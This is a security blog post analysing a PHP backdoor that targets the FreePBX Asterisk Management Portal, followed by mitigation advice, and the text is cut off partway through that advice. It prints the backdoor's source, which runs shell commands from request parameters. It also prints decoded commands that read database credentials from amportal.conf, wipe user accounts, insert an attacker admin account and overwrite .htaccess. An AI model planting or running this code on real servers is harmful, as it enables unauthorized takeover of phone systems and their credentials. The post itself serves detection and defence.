---
title: Backdoor Targets FreePBX Asterisk Management Portal
url: https://blog.sucuri.net/2022/12/backdoor-targets-freepbx-asterisk-management-portal.html
source: Sucuri Blog
date: 2022-12-16
fetch_date: 2025-10-04T01:39:12.209722
---

# Backdoor Targets FreePBX Asterisk Management Portal

[![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

[![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)

[Login](https://dashboard.sucuri.net/login/)

[Login](https://dashboard.sucuri.net/login)

New Customer?

[Sign up now.](https://sucuri.net/website-security-platform/signup/)

* [Submit a ticket](https://support.sucuri.net/support/?new)
* [Knowledge base](https://docs.sucuri.net/)
* [Chat now](https://sucuri.net/live-chat/)

Search for:

Search

* [Sucuri Labs](https://blog.sucuri.net/category/sucuri-labs)
* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [Website Security](https://blog.sucuri.net/category/website-security)

# Backdoor Targets FreePBX Asterisk Management Portal

[![](https://secure.gravatar.com/avatar/108fef16f8912ede77125c7646b2cbc2f38b7ad3c2912f7a0b8770570271134c?s=60&d=mm&r=g)](https://blog.sucuri.net/author/krasimir)

[Krasimir Konov](https://blog.sucuri.net/author/krasimir)

* December 15, 2022

![Backdoor Targets FreePBX Asterisk Management Portal](https://blog.sucuri.net/wp-content/uploads/2022/12/BlogPost_Feature-Image_1490x700_Labs-Note-Asterisk-Management-Portal-820x386.png)

Written in PHP and JavaScript, FreePBX is a web-based open-source GUI that manages Asterisk, a voice over IP and telephony server. This open-source software allows users to build customer phone systems.

During a recent investigation, I came across a simple piece of malware targeting FreePBX’s Asterisk Management portal which allowed attackers to arbitrarily add and delete users, as well as modify the website’s **.htaccess** file.

Let’s take a closer look at this backdoor.

## PHP script

The following PHP script was found on a compromised WordPress website.

```
<?php
if ($SERVER["REMOTEADDR"]=="178.162.201.166" && md5($REQUEST['secure'])=="7f02b0ae0869cc5aa38cd7ca6c767c92"){ system($REQUEST['secmd']); }
if(md5($_REQUEST["mgp"])=="4f6e5768b76809bc99bf278494b5f352")
{
echo "login correct
";
echo "";
@system($_REQUEST["c"]);
echo "";

}
system(base64_decode("bXlzcWwg…[TRIMMED]...cqJyk7Ig=="));
system(base64_decode("ZWNobyAnT3JkZX…[TRIMMED]...hY2Nlc3M="));
?>
```

The malware contains a number of checks to restrict access:

* It checks the user’s IP to ensure that it matches **178.162.201.166** (which happens to belong to a network for Leaseweb Deutschland GmbH
* It checks whether the user made a request with a password value that matches the provided md5 hash:

```
if(md5($_REQUEST["mgp"])==
```

If these checks pass, the PHP executes an external command passed in the **secmd** parameter of the request.

From this sample, we can see some base64 encoded strings in the **system** function. Let’s take a look at what those do.

## Commands concealed in base64

Once decoded, the base64 strings reveal the true behavior of the backdoor:

```
mysql `grep AMPDB /etc/amportal.conf|grep "USER\|PASS\|NAME"| sed 's/AMPDBUSER/a/g'|sed 's/AMPDBPASS/b/g'|sed 's/AMPDBNAME/c/g'|sed 's/a=/-u/g'|sed 's/b=/ -p/g'|sed 's/c=/ /g'|tr -d '\n'` --execute "DELETE from ampusers where username!='admin';INSERT INTO ampusers (username,password_sha1,sections) VALUES ('mgknight','33c7a4df46b1a9f7d4a4636d476849205a04c6b7','*');"

echo 'Order Deny,Allow`deny from all`<Files subdirectory/*>`    deny from all`</Files>`<FilesMatch "\..*$">` Deny from all`</FilesMatch>`<FilesMatch "(^$|index\.php|config\.php|\.(gif|GIF|jpg|jpeg|png|css|js|swf|txt|ico|ttf|svg|eot|woff|wav|mp3|aac|ogg|webm)$|bootstrap\.inc\.php)">` Allow from all`</FilesMatch>`php_value max_input_vars 5000'|tr '`' '\n'>.htaccess
```

These decoded strings allow the **system** function to retrieve the amportal database, database user, and password.

The commands use the **grep** and **sed** utilities to manipulate the Asterisk **amportal.conf** configuration file. It then uses the mysql utility to execute an SQL query that deletes users from the database followed by inserting their own malicious user with the name **mgknight**, giving the attackers access to the Asterisk management portal.

If no instructions are provided, the malware defaults to updating the FreeBPX login credentials and adding rules to the .**htaccess** file. These directives specify which files should be allowed or denied access based on their names and location in the directory tree, as well as the value of the **php\_value max\_input\_vars** directives.

## Mitigation steps:

[Backdoors](https://blog.sucuri.net/2022/05/examining-emerging-backdoors.html) are often exploited by attackers to gain unauthorized access to websites long after initial infection has occurred. In this case, the attacker’s simple PHP script provided them with all the power needed to arbitrarily add and modify users in the Asterisk Management Portal — as well as modify the site’s **.htaccess** file.

To mitigate risk, there are a number of steps you can take to protect your website from backdoors:

1. **Keep your software, plugins, themes and extensible components updated.** Always patch to the latest version to ensure you’re protecting against known [software vulnerabilities](https://blog.sucuri.net/category/vulnerability-disclosure).
2. **Use** [**strong and unique passwords**](https://blog.su...